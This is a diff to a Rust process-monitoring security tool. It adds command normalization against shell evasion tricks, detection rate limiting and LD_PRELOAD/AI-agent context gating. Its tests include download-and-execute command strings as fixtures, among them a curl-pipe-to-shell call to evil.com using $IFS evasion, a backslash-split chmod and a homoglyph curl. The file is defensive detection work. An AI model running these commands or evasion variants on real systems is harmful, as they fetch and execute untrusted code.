@@ -6,9 +6,10 @@ use crate::stats;
 use nix::libc;
 use procfs::process::Process;
 use rand::Rng;
-use std::collections::{HashMap, HashSet};
+use std::collections::{HashMap, HashSet, VecDeque};
 use std::fs;
 use std::path::Path;
+use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::sync::broadcast;
 use tokio::time::{Duration, sleep};
 use tracing::{info, warn};
@@ -21,12 +22,16 @@ struct ProcessSnapshot {
     start_ticks: Option<u64>,
 }
 
+const DETECTION_RATE_LIMIT_MAX: usize = 3;
+const DETECTION_RATE_LIMIT_WINDOW_SECS: i64 = 60;
+
 pub struct ProcessCollector {
     cfg: Config,
     tx: broadcast::Sender<SecurityEvent>,
     prev_processes: HashMap<i32, Option<u64>>,
     process_tree: HashMap<i32, Vec<i32>>,
     datasets: Option<DatasetManager>,
+    detection_rate_limits: HashMap<(i32, String), VecDeque<i64>>,
 }
 
 impl ProcessCollector {
@@ -55,6 +60,7 @@ impl ProcessCollector {
             prev_processes: HashMap::new(),
             process_tree: HashMap::new(),
             datasets,
+            detection_rate_limits: HashMap::new(),
         }
     }
 
@@ -152,7 +158,7 @@ impl ProcessCollector {
     }
 
     fn analyze_monitored_process(
-        &self,
+        &mut self,
         pid: i32,
         snapshot: &ProcessSnapshot,
         all: &HashMap<i32, ProcessSnapshot>,
@@ -362,8 +368,29 @@ impl ProcessCollector {
             &snapshot.enrichment.env,
             &snapshot.info.exe,
         );
-        if !dangerous_hits.is_empty() {
-            let level = if dangerous_hits.iter().copied().any(detection_is_red) {
+        let parent_is_known_ai_agent = parent
+            .map(|p| self.is_ai_agent(&p.info.name, &p.info.cmdline, &p.info.exe))
+            .unwrap_or(false);
+        let root_pid = ancestry.first().map(|(ancestor_pid, _)| *ancestor_pid).unwrap_or(pid);
+        let gated_hits = dangerous_hits
+            .into_iter()
+            .filter(|rule| {
+                detection_context_gate(
+                    rule,
+                    DetectionContext {
+                        is_allow_listed: false,
+                        parent_is_known_ai_agent,
+                        ld_preload: snapshot.enrichment.env.get("LD_PRELOAD").map(String::as_str),
+                    },
+                )
+            })
+            .collect::<Vec<_>>();
+        let final_hits = gated_hits
+            .into_iter()
+            .filter(|rule| self.allow_detection_hit(root_pid, rule))
+            .collect::<Vec<_>>();
+        if !final_hits.is_empty() {
+            let level = if final_hits.iter().copied().any(detection_is_red) {
                 ThreatLevel::Red
             } else {
                 ThreatLevel::Orange
@@ -379,7 +406,7 @@ impl ProcessCollector {
                 level,
                 format!(
                     "Dangerous command pattern(s) [{}] | ancestry: {chain}",
-                    dangerous_hits.join(",")
+                    final_hits.join(",")
                 ),
                 snapshot,
                 all,
@@ -413,6 +440,27 @@ impl ProcessCollector {
         event.process = Some(proc);
         event.enrichment = Some(snapshot.enrichment.clone());
         mitre::infer_and_tag(event)
+    }
+
+    fn allow_detection_hit(&mut self, tree_root_pid: i32, rule: &str) -> bool {
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs() as i64)
+            .unwrap_or_default();
+        let key = (tree_root_pid, rule.to_string());
+        let bucket = self.detection_rate_limits.entry(key).or_default();
+        while let Some(oldest) = bucket.front().copied() {
+            if now - oldest > DETECTION_RATE_LIMIT_WINDOW_SECS {
+                bucket.pop_front();
+            } else {
+                break;
+            }
+        }
+        if bucket.len() >= DETECTION_RATE_LIMIT_MAX {
+            return false;
+        }
+        bucket.push_back(now);
+        true
     }
 
     fn build_process_tree(&self, all: &HashMap<i32, ProcessSnapshot>) -> HashMap<i32, Vec<i32>> {
@@ -926,10 +974,12 @@ fn detect_dangerous_commands_with_context(
     env: &HashMap<String, String>,
     exe: &str,
 ) -> Vec<&'static str> {
-    let lower = canonicalize_for_detection(cmdline);
+    let normalized_cmdline = normalize_command(cmdline);
+    let normalized_parent_cmdline = normalize_command(parent_cmdline);
+    let lower = canonicalize_for_detection(&normalized_cmdline);
     let lower_process = process_name.to_ascii_lowercase();
     let lower_parent = parent_name.to_ascii_lowercase();
-    let lower_parent_cmdline = canonicalize_for_detection(parent_cmdline);
+    let lower_parent_cmdline = canonicalize_for_detection(&normalized_parent_cmdline);
     let lower_working_dir = working_dir.to_ascii_lowercase();
     let lower_exe = exe.to_ascii_lowercase();
     let mut hits = Vec::new();
@@ -1198,6 +1248,69 @@ fn detection_is_red(hit: &str) -> bool {
             | "ld_preload_set"
             | "ssh_authorized_keys_modification"
     )
+}
+
+struct DetectionContext<'a> {
+    is_allow_listed: bool,
+    parent_is_known_ai_agent: bool,
+    ld_preload: Option<&'a str>,
+}
+
+fn detection_context_gate(rule: &str, ctx: DetectionContext<'_>) -> bool {
+    match rule {
+        "ai_skill_directory_spawn" => !ctx.is_allow_listed && ctx.parent_is_known_ai_agent,
+        "ld_preload_set" => ctx
+            .ld_preload
+            .is_some_and(ld_preload_contains_non_standard_path),
+        _ => true,
+    }
+}
+
+fn ld_preload_contains_non_standard_path(value: &str) -> bool {
+    value
+        .split(':')
+        .map(str::trim)
+        .filter(|item| !item.is_empty())
+        .any(|item| !item.starts_with("/usr/lib") && !item.starts_with("/lib"))
+}
+
+fn normalize_command(input: &str) -> String {
+    let without_ifs = input.replace("$IFS", " ");
+    let mut unescaped = String::with_capacity(without_ifs.len());
+    let mut chars = without_ifs.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch == '\\' {
+            if let Some(next) = chars.peek().copied()
+                && (next.is_ascii_alphanumeric() || next == ' ')
+            {
+                unescaped.push(next);
+                chars.next();
+                continue;
+            }
+        }
+        unescaped.push(ch);
+    }
+
+    let mut tokens = Vec::new();
+    for token in unescaped.split_whitespace() {
+        let stripped = token.trim_matches('"').trim_matches('\'');
+        if !stripped.is_empty()
+            && stripped
+                .chars()
+                .all(|ch| ch.is_ascii_alphanumeric() || "/._-:=+@?&%".contains(ch))
+        {
+            tokens.push(stripped.to_string());
+        } else {
+            tokens.push(token.to_string());
+        }
+    }
+    let mut collapsed = tokens.join(" ");
+    collapsed = collapsed.replace('|', " | ");
+    collapsed
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_ascii_lowercase()
 }
 
 fn canonicalize_for_detection(input: &str) -> String {
@@ -1798,6 +1911,24 @@ mod tests {
     }
 
     #[test]
+    fn normalization_catches_pipe_without_spaces() {
+        let hits = detect_dangerous_commands("curl https://example.com/install.sh|bash", "/tmp");
+        assert!(hits.contains(&"download_pipe_shell"));
+    }
+
+    #[test]
+    fn normalization_strips_ifs_evasion() {
+        let hits = detect_dangerous_commands("curl$IFS http://evil.com/p.sh | sh", "/tmp");
+        assert!(hits.contains(&"download_pipe_shell"));
+    }
+
+    #[test]
+    fn normalization_handles_backslash_split_tokens() {
+        let hits = detect_dangerous_commands("ch\\mod +x /tmp/payload", "/tmp");
+        assert!(hits.contains(&"download_exec"));
+    }
+
+    #[test]
     fn detects_homoglyph_and_encoded_curl_variants() {
         let hits_homoglyph = detect_dangerous_commands("сurl https://example.com/x.sh | bash", "/");
         assert!(hits_homoglyph.contains(&"download_pipe_shell"));
@@ -2250,6 +2381,36 @@ mod tests {
         );
         assert!(hits.contains(&"ld_preload_set"));
         assert!(detection_is_red("ld_preload_set"));
+    }
+
+    #[test]
+    fn ignores_ld_preload_in_standard_library_dirs() {
+        let mut env = HashMap::new();
+        env.insert("LD_PRELOAD".to_string(), "/usr/lib/libsafe.so:/lib/libc.so".to_string());
+        let hits = detect_dangerous_commands_with_context(
+            "/usr/bin/ls",
+            "/tmp",
+            "ls",
+            "bash",
+            "bash -lc ls",
+            &["codex".into(), "bash".into(), "ls".into()],
+            &env,
+            "/usr/bin/ls",
+        );
+        let gated = hits
+            .into_iter()
+            .filter(|rule| {
+                super::detection_context_gate(
+                    rule,
+                    super::DetectionContext {
+                        is_allow_listed: false,
+                        parent_is_known_ai_agent: true,
+                        ld_preload: env.get("LD_PRELOAD").map(String::as_str),
+                    },
+                )
+            })
+            .collect::<Vec<_>>();
+        assert!(!gated.contains(&"ld_preload_set"));
     }
 
     #[test]
